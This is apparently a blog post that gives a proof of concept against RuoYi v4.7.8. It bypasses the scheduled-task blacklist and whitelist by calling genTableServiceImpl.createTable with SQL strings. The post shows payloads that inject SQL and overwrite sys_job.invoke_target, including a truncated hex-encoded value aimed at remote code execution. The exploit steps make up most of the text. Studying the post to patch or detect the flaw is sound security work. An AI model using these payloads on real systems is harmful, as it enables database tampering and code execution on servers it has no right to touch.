---
title: "RuoYi-v4.7.8-RCE-POC"
author: ["4shen0ne"]
draft: false
---

The system had vulnerabilities in the scheduled tasks before, and now I
bypass it.


## Sqli {#sqli}

In the patch, a strategy using blacklisting and whitelisting was
employed.

{{< figure src="/ox-hugo/_20240529_145528screenshot.png" >}}

However, I managed to bypass it by using a whitelist class and
successfully carried out an SQL injection.

```java
genTableServiceImpl.createTable('SELECT 1 FROM 'Hack By 1ue';')
```

{{< figure src="/ox-hugo/_20240529_145552screenshot.png" >}}

```java
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```

{{< figure src="/ox-hugo/_20240529_145610screenshot.png" >}}

success to change the data of table `job_id`


## RCE {#rce}

`JobInvokeUtil` does not allow parentheses in the string during
invocation, so I modified the parameter value of a specific job in the
original job table to hexadecimal (bypassing defense detection),
enabling another scheduled task for Remote Code Execution (RCE).

{{< figure src="/ox-hugo/_20240529_145632screenshot.png" >}}

```java
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a61... WHERE job_id = 2;')
```

{{< figure src="/ox-hugo/_20240529_145642screenshot.png" >}}

the job's invoke_target changed

{{< figure src="/ox-hugo/_20240529_145656screenshot.png" >}}

and then execute!
